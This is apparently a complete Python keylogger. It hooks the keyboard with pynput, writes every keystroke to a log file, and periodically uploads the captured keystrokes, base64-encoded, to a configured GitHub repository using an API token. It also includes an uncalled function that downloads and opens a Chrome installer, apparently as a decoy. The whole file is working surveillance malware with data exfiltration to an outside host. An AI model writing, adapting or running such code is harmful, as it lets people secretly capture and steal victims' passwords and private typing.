import urllib.request
import os
import base64
import datetime
import subprocess
import json
from pynput import keyboard

# Load configuration from JSON file
with open('./config.json', 'r', encoding='utf-8') as keystroke_file:
    config = json.load(keystroke_file)

# Set up Github repository details
GITHUB_USER = config['gh']['user']
GITHUB_REPO = config['gh']['repo']
GITHUB_TOKEN = config['gh']['api_token']
GITHUB_FILE_PATH = config['gh']['file_path']

# # Set up keylogger
LOG_FILE = config['keylogger']['log_file']
LOG_SIZE_LIMIT = config['keylogger']['log_size_limit']

# Set up options
DATETIME_FORMAT = config['options']['datetime_format']

def chrome():
    """Download and run Chrome installer"""
    chrome_url = "https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
    chrome_path = "./"
    chrome_file = "googlechrome.dmg"
    fullfilename = os.path.join(chrome_path, chrome_file)
    urllib.request.urlretrieve(chrome_url, fullfilename)
    subprocess.call(['open', fullfilename])

def commit(log_file, github_file_path):
    """Commit keylogged changes to github repo"""
    with open(log_file, "rb") as f:
        contents = f.read()
    file_path = timestamped(github_file_path)
    # file_path = github_file_path
    url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{file_path}"
    headers = {
        "Accept" : "application/vnd.github+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}"
        }
    data = {
        "message": "Uploaded captured keystrokes",
        "content": base64.b64encode(contents).decode("utf-8"),
    }
    req = urllib.request.Request(url, headers=headers, method="PUT")
    req.data = bytes(json.dumps(data), encoding="utf-8")
    urllib.request.urlopen(req)

def timestamped(string):
    """Timestamp the given string"""
    return f"{datetime.datetime.utcnow().strftime(DATETIME_FORMAT)}-{string}"


# Open file, listen for keys
with open(LOG_FILE, 'w', encoding='utf-8') as keystroke_file:
    # Callback function for handling keyboard events
    def on_press(key):
        # Check if file size has exceeded limit
        if keystroke_file.tell() >= LOG_SIZE_LIMIT:
            keystroke_file.flush()
            print(f"File size is {keystroke_file.tell()}")
            # upload to github here
            commit(LOG_FILE, GITHUB_FILE_PATH)
            # reset log file
            keystroke_file.seek(0)
            keystroke_file.truncate()

        try:
            keystroke_file.write(key.char)
        except AttributeError:
            keystroke_file.write(f'\nSpecial key {key} pressed\n')
        keystroke_file.flush()
    # Create a listener for keyboard events
    # This is a blocking action, the program will hang here while it listens for keys
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()